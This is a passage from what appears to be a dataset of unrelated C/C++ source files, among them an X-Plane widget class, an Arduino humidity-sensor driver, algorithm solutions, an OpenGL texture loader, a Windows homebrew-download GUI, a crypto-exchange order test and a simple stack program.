inOwnsWidget;\n}\n\nvoid\t\tXPCWidget::SetOwnsChildren(\n\t\t\t\t\tbool \t\t\t\t\tinOwnsChildren)\n{\n\tmOwnsChildren = inOwnsChildren;\n}\t\t\t\t\t\n\nXPCWidget::operator XPWidgetID () const\n{\n\treturn mWidget;\n}\n\nXPWidgetID XPCWidget::Get(void) const\n{\n\treturn mWidget;\n}\n\nvoid\t\tXPCWidget::AddAttachment(\n\t\t\t\t\t\t\t\tXPCWidgetAttachment * \tinAttachment, \n\t\t\t\t\t\t\t\tbool \t\t\t\t\tinOwnsAttachment,\n\t\t\t\t\t\t\t\tbool\t\t\t\t\tinPrefilter)\n{\n\tif (inPrefilter)\n\t{\n\t\tmAttachments.insert(mAttachments.begin(), AttachmentInfo(inAttachment, inOwnsAttachment));\n\t} else {\n\t\tmAttachments.push_back(AttachmentInfo(inAttachment, inOwnsAttachment));\n\t}\n}\t\t\t\t\t\t\t\t\n\nvoid\t\tXPCWidget::RemoveAttachment(\n\t\t\t\t\t\t\t\tXPCWidgetAttachment * \tinAttachment)\n{\n\tfor (AttachmentVector::iterator iter = mAttachments.begin();\n\t\t\titer != mAttachments.end(); ++iter)\n\t{\n\t\tif (iter->first == inAttachment)\n\t\t{\n\t\t\tmAttachments.erase(iter);\n\t\t\treturn;\n\t\t}\n\t}\n}\t\t\t\t\t\t\t\t\n\nint\t\t\tXPCWidget::HandleWidgetMessage(\n\t\t\t\t\t\t\t\tXPWidgetMessage\t\t\tinMessage,\n\t\t\t\t\t\t\t\tXPWidgetID\t\t\t\tinWidget,\n\t\t\t\t\t\t\t\tintptr_t\t\t\t\tinParam1,\n\t\t\t\t\t\t\t\tintptr_t\t\t\t\tinParam2)\n{\n\treturn 0;\n}\t\t\t\t\t\t\t\t\n\t\t\nint\t\t\tXPCWidget::WidgetCallback(\n\t\t\t\t\t\t\t\tXPWidgetMessage\t\t\tinMessage,\n\t\t\t\t\t\t\t\tXPWidgetID\t\t\t\tinWidget,\n\t\t\t\t\t\t\t\tintptr_t\t\t\t\tinParam1,\n\t\t\t\t\t\t\t\tintptr_t\t\t\t\tinParam2)\n{\n\tXPCWidget * me = reinterpret_cast<XPCWidget *>(XPGetWidgetProperty(inWidget, xpProperty_Object, NULL));\n\tif (me == NULL)\n\t\treturn 0;\n\t\n\tfor (AttachmentVector::iterator iter = me->mAttachments.begin(); iter != \n\t\tme->mAttachments.end(); ++iter)\n\t{\n\t\tint result = iter->first->HandleWidgetMessage(me, inMessage, inWidget, inParam1, inParam2);\n\t\tif (result != 0)\n\t\t\treturn result;\n\t}\n\n\treturn me->HandleWidgetMessage(inMessage, inWidget, inParam1, inParam2);\n}\t\t\t\t\t\t\t\t\n",
    "//\n//    FILE: CHT832X.cpp\n//  AUTHOR: Rob Tillaart\n// VERSION: 0.1.0\n// PURPOSE: Arduino library for CHT832X temperature and humidity sensor\n//     URL: https://github.com/RobTillaart/CHT832X\n\n\n#include \"CHT832X.h\"\n\n\n//  COMMANDS\n//  TODO magic numbers to descriptive const uint16_t variables.\n\n\n/////////////////////////////////////////////////////\n//\n// PUBLIC\n//\nCHT832X::CHT832X(const uint8_t address, TwoWire *wire)\n{\n  _wire    = wire;\n  _address = address;\n}\n\n\nint CHT832X::begin()\n{\n  //  check address range\n  if ((_address < 0x44) || (_address > 0x47))\n  {\n    return CHT832X_ERROR_ADDR;\n  }\n  if (! isConnected()) return CHT832X_ERROR_CONNECT;\n  return CHT832X_OK;\n}\n\n\nbool CHT832X::isConnected()\n{\n  _wire->beginTransmission(_address);\n  return (_wire->endTransmission() == 0);\n}\n\n\nuint8_t CHT832X::getAddress()\n{\n  return _address;\n}\n\n\n////////////////////////////////////////////////\n//\n//  READ THE SENSOR\n//\nint CHT832X::read()\n{\n  //  do not read too fast\n  if (millis() - _lastRead < 1000)\n  {\n    return CHT832X_ERROR_LASTREAD;\n  }\n  _lastRead = millis();\n\n  //  TEMPERATURE PART\n  uint8_t data[6] = { 0, 0, 0, 0, 0, 0 };\n  int status = _readRegister(0xE000, data, 6);\n  if (status != CHT832X_OK)\n  {\n    return status;\n  }\n\n  //  DATASHEET P16\n  //  TODO check CRC 0,1,2\n  int16_t tmp = (data[0] << 8 | data[1]);\n  _temperature = -45 + (175.0 / 65535) * tmp;\n  //  Handle temperature offset.\n  if (_tempOffset != 0.0)\n  {\n    _temperature += _tempOffset;\n  }\n\n  //  TODO check CRC 3,4,5\n  tmp = (data[3] << 8 | data[4]);\n  _humidity = (100.0 / 65535) * tmp;\n  if (_humOffset  != 0.0)\n  {\n    _humidity += _humOffset;\n    //  handle out of range.\n    if (_humidity < 0.0)   _humidity = 0.0;\n    if (_humidity > 100.0) _humidity = 100.0;\n  }\n\n  return CHT832X_OK;\n}\n\n\nuint32_t CHT832X::lastRead()\n{\n  return _lastRead;\n}\n\n\nfloat CHT832X::getHumidity()\n{\n  return _humidity;\n}\n\n\nfloat CHT832X::getTemperature()\n{\n  return _temperature;\n}\n\n\n////////////////////////////////////////////////\n//\n//  OFFSET\n//\nvoid CHT832X::setHumidityOffset(float offset)\n{\n  _humOffset = offset;\n}\n\n\nvoid CHT832X::setTemperatureOffset(float offset)\n{\n  _tempOffset = offset;\n}\n\n\nfloat CHT832X::getHumidityOffset()\n{\n  return _humOffset;\n}\n\n\nfloat CHT832X::getTemperatureOffset()\n{\n  return _tempOffset;\n}\n\n\n////////////////////////////////////////////////\n//\n//  HEATER - datasheet P17\n//\nvoid CHT832X::enableHeater()\n{\n  _writeRegister(0x306D, NULL, 0);\n}\n\n\nvoid CHT832X::enableHeaterFull()\n{\n  uint8_t buffer[3] = {0x3F, 0xFF, 0x06};\n  _writeRegister(0x306E, buffer, 3);\n}\n\n\nvoid CHT832X::enableHeaterHalf()\n{\n  uint8_t buffer[3] = {0x03, 0xFF, 0x00};\n  _writeRegister(0x306E, buffer, 3);\n}\n\n\nvoid CHT832X::enableHeaterQuarter()\n{\n  uint8_t buffer[3] = {0x00, 0x9F, 0x96};\n  _writeRegister(0x306E, buffer, 3);\n}\n\n\nvoid CHT832X::disableHeater()\n{\n _writeRegister(0x3066, NULL, 0);\n}\n\n\n\n////////////////////////////////////////////////\n//\n//  STATUS - datasheet P17\n//\nuint16_t CHT832X::getStatusRegister()\n{\n  uint8_t buffer[3] = {0, 0, 0};\n  _readRegister(0xF32D, buffer, 3);\n  //  TODO check CRC.\n  uint16_t value = buffer[0] * 256 + buffer[1];\n  //  mask all reserved bits?\n  return value;\n}\n\n\nvoid CHT832X::clearStatusRegister()\n{\n  _writeRegister(0x3041, NULL, 0);\n}\n\n\n////////////////////////////////////////////////\n//\n//  SOFTWARE RESET\n//\nvoid CHT832X::softwareReset()\n{\n  _writeRegister(0x30A2, NULL, 0);\n}\n\n\n////////////////////////////////////////////////\n//\n//  META DATA\n//\nuint16_t CHT832X::getNIST(uint8_t id)\n{\n  if (id > 2) return 0;\n  uint8_t buffer[3] = {0, 0, 0};\n  _readRegister(0x3683 + id, buffer, 3);\n  //  TODO check CRC.\n  uint16_t value = buffer[0] * 256 + buffer[1];\n  return value;\n}\n\nuint16_t CHT832X::getManufacturer()\n{\n  uint8_t buffer[3] = {0, 0};\n  _readRegister(0x3781, buffer, 3);\n  //  TODO check CRC.\n  uint16_t value = buffer[0] * 256 + buffer[1];\n  return value;\n}\n\n\n////////////////////////////////////////////////\n//\n//  PRIVATE\n//\nint CHT832X::_readRegister(uint16_t command, uint8_t * buf, uint8_t size)\n{\n  _wire->beginTransmission(_address);\n  _wire->write(command >> 8);\n  _wire->write(command & 0xFF);\n  int n = _wire->endTransmission();\n  if (n != 0)\n  {\n    return CHT832X_ERROR_I2C;\n  }\n\n  n = _wire->requestFrom(_address, size);\n  if (n != size)\n  {\n    return CHT832X_ERROR_I2C;\n  }\n\n  for (uint8_t i = 0; i < size; i++)\n  {\n    buf[i] = _wire->read();\n  }\n  return CHT832X_OK;\n}\n\n\nint CHT832X::_writeRegister(uint16_t command, uint8_t * buf, uint8_t size)\n{\n  _wire->beginTransmission(_address);\n  _wire->write(command >> 8);\n  _wire->write(command & 0xFF);\n  for (uint8_t i = 0; i < size; i++)\n  {\n    _wire->write(buf[i]);\n  }\n  int n = _wire->endTransmission();\n  if (n != 0)\n  {\n    return CHT832X_ERROR_I2C;\n  }\n  return CHT832X_OK;\n}\n\n\n//  -- END OF FILE --\n\n",
    "// Add Number Linked Lists\n\n/* node for linked list:\n\nstruct Node {\n    int data;\n    struct Node* next;\n    Node(int x) {\n        data = x;\n        next = NULL;\n    }\n};\n\n*/\n\nclass Solution {\n  public:\n     Node* addTwoLists(Node* num1, Node* num2) {\n        // Reverse both lists\n        Node* l1 = reverseList(num1);\n        Node* l2 = reverseList(num2);\n        Node* curr = nullptr;\n        int carry = 0;\n\n        // Add numbers represented by the two linked lists\n        while (l1 != nullptr || l2 != nullptr || carry > 0) {\n            int v1 = (l1 != nullptr) ? l1->data : 0;\n            int v2 = (l2 != nullptr) ? l2->data : 0;\n            int sum = v1 + v2 + carry;\n            carry = sum / 10;\n            Node* tmp = new Node(sum % 10);\n            tmp->next = curr;\n            curr = tmp;\n\n            if (l1 != nullptr) {\n                l1 = l1->next;\n            }\n            if (l2 != nullptr) {\n                l2 = l2->next;\n            }\n        }\n\n        // Remove leading zeros if any\n        while (curr != nullptr && curr->data == 0) {\n            curr = curr->next;\n        }\n\n        return curr;\n    }\n\nprivate:\n    Node* reverseList(Node* head) {\n        Node* tmpHead = nullptr;\n\n        while (head != nullptr) {\n            Node* nex = head->next;\n            if (tmpHead == nullptr) {\n                tmpHead = head;\n                tmpHead->next = nullptr;\n            } else {\n                head->next = tmpHead;\n                tmpHead = head;\n            }\n            head = nex;\n        }\n\n        return tmpHead;\n    }\n};\n",
    "/**\n * Runge Kutta 2nd order\n *   k1 = f(t, y(t))\n *   k2 = f(t + 0.75h, y(t) + 0.75 * h * t)\n *   y(t + h) = y(t) + h * (0.33 * k1 + 0.67 * k2)\n *\n * Source: https://www.youtube.com/watch?v=OAD8-GjuVC8&t=5880s (Fifinas)\n *\n * Compare with\n * https://www.fit.vut.cz/person/peringer/public/IMS/priklady/rk4-test.c.html\n * (black page) but note that's 4th order RK and the function parameters are\n * in different order and named differently\n */\n\n#define SIZE 3  // third order ODE\n\n/**\n * Equation: y''' - 7y' +2 = 0\n * see rk2-fifinas.jpg for the block diagram\n */\nvoid Dynamic(double t, double *in, double *y) {\n    in[2] = 7.0 * y[1] - 2.0;\n    in[1] = y[2];\n    in[0] = y[1];\n}\n\n/**\n * @brief 2nd order Runge Kutta step\n * @param t time\n * @param h step\n * @param y state values e.g. y(t)\n */\nvoid RK2Step(double t, double h, double *y) {\n\n    double ystart[SIZE];  // y(t)\n    double in[SIZE];      // integrator inputs\n\n    double k1[SIZE];\n    double k2[SIZE];\n\n    /* save y(t) */\n    for (int i = 0; i < SIZE; i++) {\n        ystart[i] = y[i];\n    }\n\n    Dynamic(t, in, y);\n    for (int i = 0; i < SIZE; i++) {\n        k1[i] = in[i];\n        y[i] = ystart[i] + 0.75 * h * k1[i];  // for the next call of Dynamic\n    }\n\n    Dynamic(t + 0.75 * h, in, y);\n    for (int i = 0; i < SIZE; i++) {\n        k2[i] = in[i];\n        y[i] = ystart[i] + h * ((1.0 / 3.0) * k1[i] + (2.0 / 3.0) * k2[i]);\n    }\n\n}\n\n/**\n * @brief simulation control\n */\nint main() {\n\n    /* define start and end */\n    double t_start = 0.0;\n    double t_end = 20.0;\n\n    /* step */\n    double h = 0.01;\n\n    /* initial values */\n    double y[] = {3.0, 2.0, 1.0};\n\n    double t = t_start;\n    while (t < t_end) {\n        RK2Step(t, h, y);\n\n        // print state values / do whatever\n\n        /* end precisely at t_end */\n        if (t + h * 1.01 > t_end) {\n            h = t_end - t;\n        }\n\n        /* important: increment simulation time */\n        t += h;\n    }\n}\n",
    "#include \"texture.hpp\"\n\n#define STB_IMAGE_IMPLEMENTATION\n#include <stb_image.h>\n\n#include <iostream>\n#include <unordered_map>\n\nRenderer::Texture::Texture(std::string file, unsigned int antisotrpy, unsigned int colorChannels, bool linearColorSpace) {\n\n    glGenTextures(1, &ID);\n    glBindTexture(GL_TEXTURE_2D, ID);\n\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_REPEAT);\t\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_REPEAT);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR_MIPMAP_LINEAR);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAX_ANISOTROPY, antisotrpy);\n\n    // load and generate the texture\n    int width, height, nrChannels;\n    stbi_set_flip_vertically_on_load(true);  \n    unsigned char *data = stbi_load(file.c_str(), &width, &height, &nrChannels, 0);\n\n    const GLenum lookup2[] = {0, GL_RED, GL_RG, GL_RGB, GL_RGBA};\n\n    if (data)\n    {\n        glTexImage2D(GL_TEXTURE_2D, 0, ((linearColorSpace==1)*GL_RGB)+((linearColorSpace==0&&colorChannels!=4)*GL_SRGB)+((linearColorSpace==0&&colorChannels==4)*GL_SRGB_ALPHA), width, height, 0, lookup2[colorChannels], GL_UNSIGNED_BYTE, data);\n        glGenerateMipmap(GL_TEXTURE_2D);\n    }\n    else\n    {\n        std::cout << \"Failed to load texture\\n\";\n    }\n    stbi_image_free(data);\n}\nRenderer::Texture::~Texture() {\n    glDeleteTextures(1, &ID);\n}\n\nvoid Renderer::Texture::Bind(unsigned int textureUnit, Renderer::Shader &shader, std::string textureUniform) {\n    shader.use();\n    shader.setInt(textureUniform.c_str(), textureUnit);\n    const GLenum lookup[] = {GL_TEXTURE0, GL_TEXTURE1, GL_TEXTURE2, GL_TEXTURE3, GL_TEXTURE4, GL_TEXTURE5, GL_TEXTURE6, GL_TEXTURE7, GL_TEXTURE8, GL_TEXTURE9, GL_TEXTURE10, GL_TEXTURE11, GL_TEXTURE12, GL_TEXTURE13, GL_TEXTURE14, GL_TEXTURE15};\n    glActiveTexture(lookup[textureUnit]);\n    glBindTexture(GL_TEXTURE_2D, ID);\n}\nvoid Renderer::Texture::Unbind() {\n    glBindTexture(GL_TEXTURE_2D, 0);\n}",
    "#include \"pch.h\"\r\n#include <windows.h>\r\n#include <urlmon.h>\r\n#include <shlobj.h>\r\n#include <uxtheme.h>\r\n#include <commctrl.h>\r\n#include <mmsystem.h> \r\n#pragma comment(lib, \"urlmon.lib\")\r\n#pragma comment(lib, \"comctl32.lib\")\r\n#pragma comment(lib, \"uxtheme.lib\")\r\n#pragma comment(lib, \"winmm.lib\") \r\n\r\nconstexpr int BUTTON_1 = 101;\r\nconstexpr int BUTTON_2 = 102;\r\nconstexpr int BUTTON_3 = 103;\r\nconstexpr int BUTTON_4 = 104;\r\nconstexpr int BUTTON_5 = 105;\r\nconstexpr int BUTTON_6 = 106;\r\n\r\nLRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);\r\nHBRUSH hbrBackground = NULL;\r\n\r\nstatic void PlaySoundEffect(const wchar_t* soundPath) {\r\n    mciSendString(L\"close all\", NULL, 0, NULL);\r\n    wchar_t command[MAX_PATH];\r\n    swprintf(command, MAX_PATH, L\"open \\\"%s\\\" type mpegvideo alias mySound\", soundPath);\r\n    mciSendString(command, NULL, 0, NULL);\r\n    mciSendString(L\"play mySound\", NULL, 0, NULL);\r\n}\r\n\r\nstatic void SetNightMode(HWND hwnd) {\r\n    hbrBackground = CreateSolidBrush(RGB(45, 45, 45));\r\n    InvalidateRect(hwnd, NULL, TRUE);\r\n}\r\n\r\nstatic void DownloadFile(const wchar_t* url, const wchar_t* folderPath, const wchar_t* fileName) {\r\n    wchar_t outputFile[MAX_PATH];\r\n    swprintf(outputFile, MAX_PATH, L\"%s\\\\%s\", folderPath, fileName);\r\n\r\n    HRESULT hr = URLDownloadToFile(NULL, url, outputFile, 0, NULL);\r\n\r\n    if (SUCCEEDED(hr)) {\r\n        MessageBox(NULL, L\"Download completed successfully!\", L\"Info\", MB_OK | MB_ICONINFORMATION);\r\n        PlaySoundEffect(L\"C:\\\\Windows\\\\Media\\\\notify.wav\"); \r\n    }\r\n    else {\r\n        MessageBox(NULL, L\"Download failed!\", L\"Error\", MB_OK | MB_ICONERROR);\r\n        PlaySoundEffect(L\"C:\\\\Windows\\\\Media\\\\Windows Battery Low.wav\"); \r\n    }\r\n}\r\n\r\nstatic bool GetFolderPath(wchar_t* folderPath, size_t size) {\r\n    BROWSEINFO bi = { 0 };\r\n    bi.lpszTitle = L\"Select Download Folder\";\r\n    LPITEMIDLIST pidl = SHBrowseForFolder(&bi);\r\n    if (pidl != 0) {\r\n        SHGetPathFromIDList(pidl, folderPath);\r\n        CoTaskMemFree(pidl);\r\n        return true;\r\n    }\r\n    return false;\r\n}\r\n\r\nstatic void AddButtonAnimation(HWND hwndButton) {\r\n    SetWindowLong(hwndButton, GWL_STYLE, GetWindowLong(hwndButton, GWL_STYLE) | BS_FLAT);\r\n    SetWindowTheme(hwndButton, L\"\", L\"\");\r\n}\r\n\r\nint APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {\r\n    WNDCLASS wc = { 0 };\r\n    wc.lpfnWndProc = WndProc;\r\n    wc.hInstance = hInstance;\r\n    wc.lpszClassName = L\"DownloadWindow\";\r\n    wc.hbrBackground = hbrBackground = CreateSolidBrush(RGB(45, 45, 45));\r\n    wc.hCursor = LoadCursor(NULL, IDC_ARROW);\r\n\r\n    if (!RegisterClass(&wc))\r\n        return -1;\r\n\r\n    HWND hwnd = CreateWindow(\r\n        wc.lpszClassName, L\"by MasterHunterr\", WS_OVERLAPPEDWINDOW,\r\n        CW_USEDEFAULT, CW_USEDEFAULT, 500, 400, NULL, NULL, hInstance, NULL);\r\n\r\n    if (!hwnd)\r\n        return -1;\r\n\r\n    ShowWindow(hwnd, nCmdShow);\r\n    UpdateWindow(hwnd);\r\n\r\n    MSG msg;\r\n    while (GetMessage(&msg, NULL, 0, 0)) {\r\n        TranslateMessage(&msg);\r\n        DispatchMessage(&msg);\r\n    }\r\n\r\n    return (int)msg.wParam;\r\n}\r\n\r\nLRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {\r\n    static HFONT hFont;\r\n    wchar_t folderPath[MAX_PATH] = L\"\";\r\n\r\n    switch (msg) {\r\n    case WM_CREATE: {\r\n        hFont = CreateFont(18, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET,\r\n            OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY,\r\n            DEFAULT_PITCH | FF_SWISS, L\"Segoe UI\");\r\n\r\n        HWND hButtons[6];\r\n        const wchar_t* buttonTexts[6] = {\r\n            L\"WebMAN\", L\"multiMAN \", L\"Apollo\", L\"Artemis\", L\"ManaGuZ\", L\"GamePad Test\"\r\n        };\r\n        int buttonIds[6] = { BUTTON_1, BUTTON_2, BUTTON_3, BUTTON_4, BUTTON_5, BUTTON_6 };\r\n\r\n        for (int i = 0; i < 6; ++i) {\r\n            hButtons[i] = CreateWindow(L\"BUTTON\", buttonTexts[i], WS_VISIBLE | WS_CHILD,\r\n                50 + (i % 2) * 200, 50 + (i / 2) * 60, 150, 40,\r\n                hwnd, (HMENU)buttonIds[i], NULL, NULL);\r\n            SendMessage(hButtons[i], WM_SETFONT, (WPARAM)hFont, TRUE);\r\n            AddButtonAnimation(hButtons[i]);\r\n        }\r\n\r\n        SetNightMode(hwnd);\r\n        break;\r\n    }\r\n\r\n    case WM_CTLCOLORBTN: {\r\n        HDC hdc = (HDC)wParam;\r\n        SetBkMode(hdc, TRANSPARENT);\r\n        SetTextColor(hdc, RGB(255, 255, 255));\r\n        return (INT_PTR)hbrBackground;\r\n    }\r\n\r\n    case WM_CTLCOLORDLG:\r\n    case WM_CTLCOLORSTATIC: {\r\n        HDC hdc = (HDC)wParam;\r\n        SetTextColor(hdc, RGB(255, 255, 255));\r\n        SetBkMode(hdc, TRANSPARENT);\r\n        return (INT_PTR)hbrBackground;\r\n    }\r\n\r\n    case WM_COMMAND:\r\n        switch (LOWORD(wParam)) {\r\n        case BUTTON_1:\r\n            if (GetFolderPath(folderPath, MAX_PATH)) {\r\n                DownloadFile(L\"https://store.brewology.com/get/homebrew.php?id=310&fid=2426\", folderPath, L\"WebMAN by DS.pkg\");\r\n            }\r\n            break;\r\n        case BUTTON_2:\r\n            if (GetFolderPath(folderPath, MAX_PAT",
    "#include <iostream>\n#include <algorithm>\n\nusing namespace std;\n\ntemplate<typename T>\nclass SimpleVector\n{\nprivate:\n\n    T* data;\n    int currentSize;\n    int currentCapacity;\n\npublic:\n\n    SimpleVector() : data(new T[10]), currentSize(0), currentCapacity(10)\n    {\n    }\n\n    SimpleVector(int capacity) : data(new T[capacity]), currentSize(0), currentCapacity(capacity)\n    {\n    }\n\n    SimpleVector(const SimpleVector& other)\n    {\n        currentSize = other.currentSize;\n        currentCapacity = other.currentCapacity;\n\n        data = new T[currentCapacity];\n\n        for (int i = 0; i < currentSize; ++i)\n        {\n            data[i] = other.data[i];\n        }\n    }\n\n    void resize(int newCapacity)\n    {\n        if (newCapacity <= currentCapacity)\n        {\n            return;\n        }\n\n        T* oldData = data;\n\n        data = new T[newCapacity];\n        currentSize = 0;\n\n        for (int i = 0; i < currentCapacity; ++i)\n        {\n            push_back_internal(oldData[i]);\n        }\n\n        currentCapacity = newCapacity;\n\n        if (oldData)\n        {\n            delete[] oldData;\n            oldData = nullptr;\n        }\n\n        printCurrentData();\n    }\n\n    void push_back(const T& value)\n    {\n        if (currentSize >= currentCapacity)\n        {\n            resize(1 + currentCapacity);\n        }\n\n        push_back_internal(value);\n        printCurrentData();\n    }\n\n    void pop_back()\n    {\n        currentSize--;\n\n        printCurrentData();\n    }\n\n    int size() const\n    {\n        return currentSize;\n    }\n\n    int capacity() const\n    {\n        return currentCapacity;\n    }\n\n    void sortData()\n    {\n        sort(data, data + currentSize);\n        printCurrentData();\n    }\n\n    ~SimpleVector()\n    {\n        if (data)\n        {\n            delete[] data;\n            data = nullptr;\n        }\n    }\n\nprivate:\n\n    void push_back_internal(const T& value)\n    {\n        data[currentSize] = value;\n        currentSize++;\n    }\n\n    void printCurrentData() const\n    {\n        cout << \"\ud604\uc7ac \uc6d0\uc18c : \";\n\n        for (int i = 0; i < currentSize; ++i)\n        {\n            cout << data[i];\n            cout << \", \";\n        }\n\n        cout << \"\ud604\uc7ac \ud06c\uae30 : \" << size() << \", \ud604\uc7ac \uc6a9\ub7c9 : \" << capacity();\n        cout << endl;\n    }\n};\n\nint main()\n{\n    SimpleVector<int> sv(1);\n\n    sv.push_back(5);\n    sv.push_back(4);\n    sv.push_back(3);\n    sv.push_back(2);\n    sv.push_back(1);\n    sv.push_back(10);\n    sv.push_back(134);\n\n    sv.sortData();\n\n    sv.pop_back();\n    sv.pop_back();\n    sv.pop_back();\n\n    sv.push_back(0);\n    sv.push_back(-100);\n    sv.push_back(-200);\n    sv.push_back(-300);\n\n    sv.sortData();\n\n    sv.pop_back();\n\n    sv.resize(1);\n    sv.push_back(-440);\n\n    return 0;\n}",
    "\n#include <cqs/driver/realtime_driver.hpp>\n#include <cqs/types/stringlet.hpp>\n#include <cqs/util/initialize.hpp>\n#include <cqs/util/timer.hpp>\n#include <json/json.hpp>\n\n#include <cqs/crypto_trade_api/HyperLiquidTradeApi.hpp>\n\n\n\n\nint main(int argc, char* argv[]) \n{\n    std::cout << \"*******************************************************\" << std::endl;    \n    std::cout << \"usage:  ./hltdapi 'SWAP_HYPEUSD@HYPERL' 25 0.5        \" << std::endl;    \n    std::cout << \"*******************************************************\" << std::endl;\n    cqs::util::initialize(argv[0],true,1,\"./logs\",2);\n    auto& driver = cqs::driver::realtime_driver;\n    auto symbol = cqs::types::exchange_symbol_t(argv[1]);\n    double px = cqs::util::parse_double(argv[2]);\n    double sz = cqs::util::parse_double(argv[3]);\n    cqs::crypto_trade_api::HyperLiquidTradeApi api0(driver,\n                                                   \"api.hyperliquid.xyz\", // api url  !! host \u4e0d\u8981\u52a0https://\n                                                   \"account_id\",\n                                                   \"your vault_address\", // vault_address\n                                                   \"your api_secret\", // api_secret\n                                                   0);\n    api0.initialize();\n    api0.subscribe({symbol});\n\n    driver.add_poller([&](int64_t epoch_us){\n        static cqs::util::IntervalCounter counter(5);\n        if(counter.on_interval())\n        {\n            cqs::types::LO lo(symbol, px,sz,cqs::util::seqnum++,true);\n            LOG(INFO) << \" [epoch_us] \" << epoch_us << \" [evt] ADD \" << lo;\n            api0.add_order(lo.symbol,lo.oid,lo.px,lo.sz,\"LIMIT\");\n        }\n    });\n\n    driver.register_event<cqs::types::Ack>([&](const cqs::types::Ack& ack, int64_t epoch_us){\n        LOG(INFO) << \" [epoch_us] \" << epoch_us << \" [evt] ACK \" << ack;\n        api0.del_order(ack.symbol,ack.oid);\n    });\n\n    driver.register_event<cqs::types::Cancel>([](const cqs::types::Cancel& can, int64_t epoch_us){\n        LOG(INFO) << \" [epoch_us] \" << epoch_us << \" [evt] CXL \" << can;\n    });\n    \n    driver.register_event<cqs::types::Reject>([](const cqs::types::Reject& rej, int64_t epoch_us){\n        LOG(INFO) << \" [epoch_us] \" << epoch_us << \" [evt] REJ \" << rej;\n    });\n\n    driver.run(0); \n\n    return 0;\n}\n    ",
    "class Solution {\npublic:\n    vector<vector<int>> highestPeak(vector<vector<int>>& isWater) {\n        int dx[4] = {0, 0, 1,\n                     -1};  // Horizontal movement: right, left, down, up\n        int dy[4] = {1, -1, 0, 0};  // Vertical movement corresponding to dx\n\n        int rows = isWater.size();\n        int columns = isWater[0].size();\n\n        // Initialize the height matrix with -1 (unprocessed cells)\n        vector<vector<int>> cellHeights(rows, vector<int>(columns, -1));\n\n        queue<pair<int, int>> cellQueue;\n\n        // Add all water cells to the queue and set their height to 0\n        for (int x = 0; x < rows; x++) {\n            for (int y = 0; y < columns; y++) {\n                if (isWater[x][y]) {\n                    cellQueue.push({x, y});\n                    cellHeights[x][y] = 0;\n                }\n            }\n        }\n\n        // Initial height for land cells adjacent to water\n        int heightOfNextLayer = 1;\n\n        while (!cellQueue.empty()) {\n            int layerSize = cellQueue.size();\n\n            // Iterate through all cells in the current layer\n            for (int i = 0; i < layerSize; i++) {\n                pair<int, int> currentCell = cellQueue.front();\n                cellQueue.pop();\n\n                // Check all four possible directions for neighboring cells\n                for (int d = 0; d < 4; d++) {\n                    pair<int, int> neighborCell = {currentCell.first + dx[d],\n                                                   currentCell.second + dy[d]};\n\n                    // Check if the neighbor is valid and unprocessed\n                    if (isValidCell(neighborCell, rows, columns) &&\n                        cellHeights[neighborCell.first][neighborCell.second] ==\n                            -1) {\n                        cellHeights[neighborCell.first][neighborCell.second] =\n                            heightOfNextLayer;\n                        cellQueue.push(neighborCell);\n                    }\n                }\n            }\n            heightOfNextLayer++;  // Increment height for the next layer\n        }\n\n        return cellHeights;\n    }\n\nprivate:\n    // Function to check if a cell is within the grid boundaries\n    bool isValidCell(pair<int, int> cell, int rows, int columns) {\n        return cell.first >= 0 && cell.second >= 0 && cell.first < rows &&\n               cell.second < columns;\n    }\n};",
    "#include<iostream>\n\nusing namespace std;\n\nclass Stack{\n    private:\n        int *arr;\n        int  top;\n        int  capacity;\n        int  count;\n    public:\n        Stack(int size){\n            this->arr = new int[size];\n            this->capacity = size;\n            this->top = -1;\n            this->count = 0;\n        }\n\n        void pushData(int);\n        void popData();\n        void peekData();\n        void viewData();\n        bool isEmpty();\n        bool isFull();\n};\n\nvoid Stack::pushData(int data){\n    if(this->top == this->capacity-1){\n        cout << \"Stack is Overflow ! \" << endl;\n        return;\n    }\n    this->top++;\n    this->arr[top] = data;\n    this->count++;\n    cout << \"Data is Pushed.... \" << endl;\n}\n\nvoid Stack::popData(){\n    if(this->top == -1){\n        cout << \"Stack is Empty !!\" << endl;\n    }\n    this->top--;\n    cout << \"Data is Poped....\" << endl;\n}\n\nvoid Stack::peekData(){\n    if(this->top == -1){\n        cout << \"Stack is Empty !!\" << endl;\n    }\n    cout << \"Peeked Data is := \" << top[arr] << endl;\n}\n\nvoid Stack::viewData(){\n    if(this->top == -1){\n        cout << \"Stack is Empty !!\" << endl;\n    }\n    for(int i = this->top; i >= 0; i--){\n        cout << arr[i] << \" \";\n    }\n}\n\nbool Stack::isEmpty(){\n    if(this->top == -1){\n        return true;\n    }else{\n        return false;\n    }\n}\n\nbool Stack::isFull(){\n    if(this->top == this->capacity -1){\n        return true;\n    }else{\n        return false;\n    }\n}\n   \n\nint main(){\n    Stack s(4);\n    int choice;\n\n    do{\n        cout << \"-------------------STACK OPERATION------------------\" << endl;\n        cout << \"Enter 1 for Push Data :- \" << endl;\n        cout << \"Enter 2 for Pop Data :- \" << endl;\n        cout << \"Enter 3 for Peek Data :- \" << endl;\n        cout << \"Enter 4 for view Data :-  \" << endl;\n        cout << \"Enter 5 for isEmpty or Not :- \" << endl;\n        cout << \"Enter 6 for isFull or Not :- \" << endl;\n        cout << \"Enter 0 for Exit!! :- \" << endl;\n        cout << \"-------------------STACK OPERATION------------------\" << endl;\n\n        cout << \"Enter Your Choice := \";\n        cin >> choice;\n\n        switch(choice){\n            case 1:{\n                int data;\n\n                cout << \"Enter your Data :- \";\n                cin >> data;\n                \n                s.pushData(data);\n                break;\n            }\n            case 2:{\n\n                s.popData();\n                break;\n            }\n            case 3:{\n\n                s.peekData();\n                break;\n            }\n            case 4:{\n\n                s.viewData();\n                break;\n            }\n            case 